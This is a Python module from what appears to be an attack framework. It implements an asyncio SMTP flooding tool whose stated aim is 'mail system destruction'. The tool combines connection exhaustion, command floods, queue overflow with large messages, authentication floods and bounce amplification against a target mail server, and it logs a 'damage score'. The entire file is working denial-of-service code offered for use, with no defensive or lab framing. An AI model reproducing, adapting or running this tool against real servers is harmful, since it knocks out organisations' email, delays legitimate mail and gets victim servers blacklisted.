"""
SMTP Amplification & Connection Flood - Mail System Destruction
=============================================================

DANGER LEVEL: HIGH
- Resource starvation: SMTP servers allocate threads/processes per connection
- Mail queue overload: partial sessions clog mail transfer agent queues
- Connection table exhaustion: keeps SMTP sessions in half-open state
- Back-off and greylisting triggers affecting legitimate mail

Real-World Impact:
- Can bring down corporate mail systems, preventing all mail flow
- Triggers reputation damage and blacklisting of victim mail servers
- May cause legitimate email delivery delays for days
"""

import asyncio
import random
import string
import time
from typing import Dict, Any, List
import smtplib
import socket
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from common.logger import logger, stats_logger

class SmtpAmplificationFlooder:
    """SMTP amplification and connection flood for mail system destruction."""
    
    def __init__(self, config: Dict[str, Any]):
        self.target = config['target']
        self.port = config.get('port', 25)  # SMTP default
        self.duration = config['duration']
        self.concurrency = config['concurrency']
        self.delay = config.get('delay', 0.1)  # Slower for SMTP
        
        # SMTP attack techniques
        self.attack_modes = [
            'connection_exhaustion',
            'command_flood',
            'mail_queue_overflow', 
            'authentication_flood',
            'bounce_amplification'
        ]
        
        # Generate fake email data
        self.fake_domains = self._generate_fake_domains()
        self.fake_emails = self._generate_fake_emails()
        self.large_messages = self._generate_large_messages()
        
        self.stats = {
            'connections_attempted': 0,
            'connections_established': 0,
            'commands_sent': 0,
            'mail_queue_pressure': 0,
            'server_errors': 0,
            'authentication_attempts': 0,
            'errors': 0
        }

    def _generate_fake_domains(self) -> List[str]:
        """Generate fake domain names for email addresses."""
        tlds = ['.com', '.org', '.net', '.info', '.biz', '.co.uk', '.de', '.fr']
        domains = []
        
        for _ in range(100):
            domain_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 12)))
            tld = random.choice(tlds)
            domains.append(domain_name + tld)
        
        return domains

    def _generate_fake_emails(self) -> List[str]:
        """Generate fake email addresses."""
        emails = []
        users = ['admin', 'info', 'support', 'sales', 'contact', 'noreply', 'user', 'test']
        
        for _ in range(200):
            user = random.choice(users) + str(random.randint(1, 999))
            domain = random.choice(self.fake_domains)
            emails.append(f"{user}@{domain}")
        
        return emails

    def _generate_large_messages(self) -> List[str]:
        """Generate large email messages for queue overflow."""
        messages = []
        
        # Generate messages of various sizes
        for size_kb in [10, 50, 100, 500, 1000]:  # KB
            content = 'X' * (size_kb * 1024)
            subject = f"Large Message Test {size_kb}KB - {random.randint(1000, 9999)}"
            
            message = f"""Subject: {subject}
From: test@example.com
To: victim@{self.target}
MIME-Version: 1.0
Content-Type: text/plain

{content}
"""
            messages.append(message)
        
        return messages

    async def run(self):
        """Execute SMTP amplification flood attack."""
        logger.info(f"📧💀 Starting SMTP AMPLIFICATION FLOOD against {self.target}:{self.port}")
        logger.warning("⚠️  HIGH DANGER: Will destroy corporate mail systems")
        logger.warning(f"📧 {self.concurrency} concurrent SMTP attacks for {self.duration}s")
        logger.warning("💀 IMPACT: Mail queue overflow, connection exhaustion, reputation damage")
        
        start_time = time.time()
        
        # Update stats
        stats_logger.update_stats(
            target=self.target,
            vector='smtp_amplification',
            status='running'
        )
        
        try:
            # Create semaphore to control concurrency
            semaphore = asyncio.Semaphore(self.concurrency)
            
            # Launch attack tasks
            tasks = []
            while time.time() - start_time < self.duration:
                if len(tasks) < self.concurrency:
                    # Randomly select attack mode
                    attack_mode = random.choice(self.attack_modes)
                    
                    task = asyncio.create_task(
                        self._smtp_attack_vector(semaphore, attack_mode)
                    )
                    tasks.append(task)
                
                # Clean up completed tasks
                tasks = [t for t in tasks if not t.done()]
                await asyncio.sleep(0.1)
            
            # Wait for remaining tasks
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
                
        except Exception as e:
            logger.error(f"❌ SMTP amplification failed: {e}")
        finally:
            self._log_attack_results()
            stats_logger.update_stats(status='completed')

    async def _smtp_attack_vector(self, semaphore: asyncio.Semaphore, attack_mode: str):
        """Execute specific SMTP attack vector."""
        async with semaphore:
            try:
                if attack_mode == 'connection_exhaustion':
                    await self._connection_exhaustion_attack()
                elif attack_mode == 'command_flood':
                    await self._command_flood_attack()
                elif attack_mode == 'mail_queue_overflow':
                    await self._mail_queue_overflow_attack()
                elif attack_mode == 'authentication_flood':
                    await self._authentication_flood_attack()
                elif attack_mode == 'bounce_amplification':
                    await self._bounce_amplification_attack()
                
            except Exception as e:
                self.stats['errors'] += 1
                logger.debug(f"SMTP attack vector {attack_mode} failed: {e}")
            
            finally:
                await asyncio.sleep(self.delay)

    async def _connection_exhaustion_attack(self):
        """Exhaust SMTP server connection pool."""
        try:
            # Connect but don't complete handshake
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target, self.port),
                timeout=30.0
            )
            
            self.stats['connections_attempted'] += 1
            
            # Read SMTP banner
            banner = await reader.read(1024)
            if b'220' in banner:
                self.stats['connections_established'] += 1
                logger.debug(f"📧 SMTP connection established: {banner.decode().strip()}")
            
            # Send HELO but delay response
            writer.write(b'HELO attacker.example.com\r\n')
            await writer.drain()
            self.stats['commands_sent'] += 1
            
            # Keep connection alive to consume resources
            await asyncio.sleep(random.uniform(30, 120))  # Hold connection
            
            writer.close()
            await writer.wait_closed()
            
        except asyncio.TimeoutError:
            # Server too slow = connection exhaustion success
            logger.debug("📧 SMTP timeout - server overwhelmed")
        except ConnectionRefusedError:
            # Connection refused = server overwhelmed
            logger.debug("📧 SMTP connection refused - server overwhelmed")

    async def _command_flood_attack(self):
        """Flood SMTP server with commands."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target, self.port),
                timeout=10.0
            )
            
            self.stats['connections_attempted'] += 1
            
            # Read banner
            await reader.read(1024)
            self.stats['connections_established'] += 1
            
            # Flood with SMTP commands
            commands = [
                b'HELO spam.example.com\r\n',
                b'MAIL FROM:<spammer@evil.com>\r\n',
                b'RCPT TO:<victim1@victim.com>\r\n',
                b'RCPT TO:<victim2@victim.com>\r\n',
                b'RCPT TO:<victim3@victim.com>\r\n',
                b'DATA\r\n',
                b'RSET\r\n',
                b'VRFY admin\r\n',
                b'EXPN users\r\n',
                b'HELP\r\n'
            ]
            
            for cmd in commands:
                writer.write(cmd)
                await writer.drain()
                self.stats['commands_sent'] += 1
                
                # Try to read response
                try:
                    response = await asyncio.wait_for(reader.read(1024), timeout=1.0)
                    if b'ERROR' in response or b'421' in response:
                        self.stats['server_errors'] += 1
                except asyncio.TimeoutError:
                    pass  # Server too slow
            
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            logger.debug(f"SMTP command flood error: {e}")

    async def _mail_queue_overflow_attack(self):
        """Overflow mail server queue with large messages."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target, self.port),
                timeout=10.0
            )
            
            self.stats['connections_attempted'] += 1
            
            # Complete SMTP handshake
            await reader.read(1024)  # Banner
            
            writer.write(b'HELO queue-flooder.com\r\n')
            await writer.drain()
            await reader.read(1024)
            
            # Send large message
            fake_sender = random.choice(self.fake_emails)
            fake_recipient = f"user{random.randint(1, 1000)}@{self.target}"
            large_message = random.choice(self.large_messages)
            
            writer.write(f'MAIL FROM:<{fake_sender}>\r\n'.encode())
            await writer.drain()
            await reader.read(1024)
            
            writer.write(f'RCPT TO:<{fake_recipient}>\r\n'.encode())
            await writer.drain() 
            await reader.read(1024)
            
            writer.write(b'DATA\r\n')
            await writer.drain()
            await reader.read(1024)
            
            # Send large message body
            writer.write(large_message.encode() + b'\r\n.\r\n')
            await writer.drain()
            
            self.stats['connections_established'] += 1
            self.stats['mail_queue_pressure'] += len(large_message)
            
            response = await reader.read(1024)
            if b'250' in response:
                logger.debug(f"📧 Large message queued: {len(large_message)} bytes")
            
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            logger.debug(f"Mail queue overflow error: {e}")

    async def _authentication_flood_attack(self):
        """Flood authentication attempts to trigger rate limiting."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target, self.port),
                timeout=10.0
            )
            
            self.stats['connections_attempted'] += 1
            
            # SMTP handshake
            await reader.read(1024)  # Banner
            
            writer.write(b'EHLO auth-flooder.com\r\n')
            await writer.drain()
            capabilities = await reader.read(1024)
            
            if b'AUTH' in capabilities:
                # Attempt authentication flood
                for i in range(20):  # Multiple auth attempts
                    username = f"user{random.randint(1, 1000)}"
                    password = f"pass{random.randint(1, 1000)}"
                    
                    writer.write(b'AUTH LOGIN\r\n')
                    await writer.drain()
                    await reader.read(1024)
                    
                    # Send fake credentials
                    import base64
                    user_b64 = base64.b64encode(username.encode()).decode()
                    pass_b64 = base64.b64encode(password.encode()).decode()
                    
                    writer.write(f'{user_b64}\r\n'.encode())
                    await writer.drain()
                    await reader.read(1024)
                    
                    writer.write(f'{pass_b64}\r\n'.encode())
                    await writer.drain()
                    response = await reader.read(1024)
                    
                    self.stats['authentication_attempts'] += 1
                    
                    if b'535' in response:  # Auth failed
                        logger.debug("📧 Authentication failed (expected)")
                    
                    await asyncio.sleep(0.1)
            
            self.stats['connections_established'] += 1
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            logger.debug(f"Authentication flood error: {e}")

    async def _bounce_amplification_attack(self):
        """Trigger bounce messages for amplification."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target, self.port),
                timeout=10.0
            )
            
            self.stats['connections_attempted'] += 1
            
            # Send message to invalid recipient to trigger bounce
            await reader.read(1024)  # Banner
            
            writer.write(b'HELO bounce-generator.com\r\n')
            await writer.drain()
            await reader.read(1024)
            
            # Invalid recipient to trigger bounce
            invalid_recipient = f"nonexistent{random.randint(10000, 99999)}@{self.target}"
            
            writer.write(b'MAIL FROM:<bounce@attacker.com>\r\n')
            await writer.drain()
            await reader.read(1024)
            
            writer.write(f'RCPT TO:<{invalid_recipient}>\r\n'.encode())
            await writer.drain()
            response = await reader.read(1024)
            
            if b'550' not in response:  # If not immediately rejected
                writer.write(b'DATA\r\n')
                await writer.drain()
                await reader.read(1024)
                
                # Send message that will bounce
                bounce_message = f"""Subject: Bounce Test {random.randint(1000, 9999)}
From: bounce@attacker.com
To: {invalid_recipient}

This message will bounce back, amplifying traffic.
{random.choice(self.large_messages[:2])}  # Use smaller message for bounces
"""
                
                writer.write(bounce_message.encode() + b'\r\n.\r\n')
                await writer.drain()
                await reader.read(1024)
                
                logger.debug(f"📧 Bounce message sent to {invalid_recipient}")
            
            self.stats['connections_established'] += 1
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            logger.debug(f"Bounce amplification error: {e}")

    def _log_attack_results(self):
        """Log the results of SMTP amplification attack."""
        connections = self.stats['connections_established']
        commands = self.stats['commands_sent']
        queue_pressure = self.stats['mail_queue_pressure']
        server_errors = self.stats['server_errors']
        auth_attempts = self.stats['authentication_attempts']
        
        logger.info("📧💀 SMTP AMPLIFICATION RESULTS:")
        logger.info(f"   🔗 Connections Established: {connections:,}")
        logger.info(f"   📝 Commands Sent: {commands:,}")
        logger.info(f"   📮 Mail Queue Pressure: {queue_pressure / 1024 / 1024:.1f} MB")
        logger.info(f"   ❌ Server Errors Triggered: {server_errors:,}")
        logger.info(f"   🔐 Authentication Attempts: {auth_attempts:,}")
        
        if connections > 100:
            logger.warning("📧 HIGH CONNECTION COUNT - Mail server likely overwhelmed")
        if queue_pressure > 100 * 1024 * 1024:  # > 100MB
            logger.warning("💀 MASSIVE QUEUE PRESSURE - Mail system likely failing")
        if server_errors > 50:
            logger.warning("🔥 HIGH ERROR RATE - Mail server under severe stress")
        if auth_attempts > 100:
            logger.warning("🔐 AUTHENTICATION FLOOD - Rate limiting likely triggered")
        
        # Estimate impact
        estimated_damage = (connections * 10) + (queue_pressure // 1024) + (server_errors * 5)
        logger.info(f"   💀 Estimated Damage Score: {estimated_damage:,}")
        
        if estimated_damage > 1000:
            logger.warning("🚨 CRITICAL IMPACT - Corporate mail system likely down")
        
        # Update global stats
        stats_logger.update_stats(
            packets_sent=commands,
            data_transmitted=queue_pressure,
            attack_effectiveness=min(100, estimated_damage // 10)
        )
